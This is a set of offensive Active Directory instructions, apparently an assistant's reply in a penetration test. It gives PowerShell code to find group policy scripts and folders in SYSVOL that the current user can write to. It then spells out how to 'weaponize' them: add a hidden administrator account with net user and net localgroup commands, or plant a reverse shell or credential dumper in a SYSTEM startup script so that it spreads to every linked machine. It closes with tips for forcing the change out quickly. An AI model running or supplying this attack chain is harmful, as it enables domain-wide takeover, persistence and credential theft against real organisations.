1. Check write access — the 5 found scripts + their folders

$f = Get-Content .\*_sysvol_findings.json -Raw | ConvertFrom-Json
$me = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$groups = $me.Groups | ForEach-Object { try { $_.Translate([System.Security.Principal.NTAccount]).Value } catch { $null } }

function Test-Write([string]$Path) {
    $acl = Get-Acl $Path -ErrorAction SilentlyContinue
    if (-not $acl) { return $false }
    foreach ($ace in $acl.Access) {
        if ($ace.AccessControlType -eq 'Allow' -and
            ($ace.IdentityReference.Value -eq $me.Name -or $groups -contains $ace.IdentityReference.Value -or
             $ace.IdentityReference.Value -in @('Everyone','BUILTIN\Users','Authenticated Users','BUILTIN\Authenticated Users')) -and
            (($ace.FileSystemRights -band [System.Security.AccessControl.FileSystemRights]::Write) -or
             ($ace.FileSystemRights -band [System.Security.AccessControl.FileSystemRights]::Modify) -or
             ($ace.FileSystemRights -band [System.Security.AccessControl.FileSystemRights]::FullControl))) {
            return $true
        }
    }
    return $false
}

$f | Where-Object Type -eq 'Script' | ForEach-Object {
    foreach ($p in @($_.File, (Split-Path $_.File))) {
        "{0,-8} {1}" -f $(if (Test-Write $p) {'WRITABLE'} else {'readonly'}), $p
    }
}

2. Broader check — any writable folder under SYSVOL Policies

The 5 scripts are only the visible candidates; there may be other writable GPO folders:

$pol = "\\domain.local\SYSVOL\domain.local\Policies"
Get-ChildItem $pol -Directory -ErrorAction SilentlyContinue | ForEach-Object {
    Get-ChildItem $_.FullName -Recurse -Directory -ErrorAction SilentlyContinue
} | ForEach-Object { if (Test-Write $_.FullName) { "WRITABLE DIR: $($_.FullName)" } }

3. If anything is WRITABLE → weaponize

Edit the startup script (SYSTEM) with something like:

net user pentest 'Str0ng!Pass' /add
net localgroup administrators pentest /add

or a PowerShell reverse shell / credential dumper. It will propagate to every machine that GPO links to.

Timing/notes:
- SYSVOL replicates between DCs (usually minutes); group policy refreshes every ~90 min ±30 — force it faster with gpupdate /force on a target, or reboot for machine-startup scripts.
- This is high-impact and org-wide — it changes a GPO that affects every linked machine, not just one box. Keep it strictly within engagement scope and have a cleanup plan (revert the script afterward).
- If you don't have write but you're in Group Policy Creator Owners (or can get a member), that's a separate path — you can create a new GPO and link it.

